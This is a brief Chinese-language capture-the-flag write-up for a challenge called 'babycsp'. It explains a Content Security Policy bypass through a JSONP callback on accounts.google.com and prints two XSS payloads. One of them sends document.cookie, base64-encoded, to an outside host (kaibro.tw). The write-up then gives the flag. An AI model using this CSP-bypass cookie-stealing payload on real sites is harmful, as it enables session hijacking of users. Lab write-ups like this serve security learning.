# babycsp

CSP限制只能使用 `*.google.com` 的來源，然後`connect-src: *`

所以找個`*.google.com`的JSONP就能觸發XSS:

`<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(87);alert"></script>`

`<script src="https://accounts.google.com/o/oauth2/revoke?callback=fetch('http://kaibro.tw/?'%2bbtoa(document.cookie));btoa"></script>`

只是xss bot非常不穩定

我送了幾百次才收到Request

`flag{csp_will_solve_EVERYTHING}`
